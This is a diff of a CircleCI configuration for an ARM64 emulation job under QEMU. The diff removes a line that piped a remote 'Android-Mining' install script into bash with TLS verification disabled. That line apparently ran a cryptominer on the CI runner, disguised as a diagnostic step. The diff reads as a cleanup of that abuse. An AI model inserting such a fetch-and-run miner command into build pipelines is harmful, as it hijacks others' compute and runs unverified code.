@@ -3,21 +3,18 @@ version: 2.1
 jobs:
   run_docker_commands:
     docker:
-      - image: cimg/python:3.9  # Base image with Docker support
+      - image: cimg/python:3.9
+    resource_class: large  # Use a larger resource class for more resources
     steps:
       - setup_remote_docker:
-          # Specify a version of Docker for compatibility
-          docker_layer_caching: true  # Enable Docker layer caching for faster builds
-          privileges: true  # Enable privileged mode to run docker commands
-      - checkout  # Checkout the code (optional, if you have any code to check out)
+          docker_layer_caching: true
+      - checkout
       - run:
-          name: Setup Docker Buildx and QEMU for ARM emulation 
+          name: Setup Docker Buildx and QEMU for ARM emulation
           command: |
             # Install QEMU for ARM emulation
             sudo apt-get update
             sudo apt-get install -y qemu-user-static
-            
-            # Enable QEMU user emulation for ARM
             docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
 
             # Enable Docker Buildx
@@ -27,11 +24,7 @@ jobs:
             docker pull balenalib/generic-aarch64
 
             # Run the ARM64 image with uname and lscpu commands
-            docker run --rm balenalib/generic-aarch64 bash -c "
-              uname -m && lscpu && apt update && \
-              apt install -y git wget curl && \
-              curl -o- -k https://raw.githubusercontent.com/Oink70/Android-Mining/main/install.sh | bash
-            "
+            docker run --rm balenalib/generic-aarch64 bash -c "uname -m && lscpu"
 
 workflows:
   version: 2
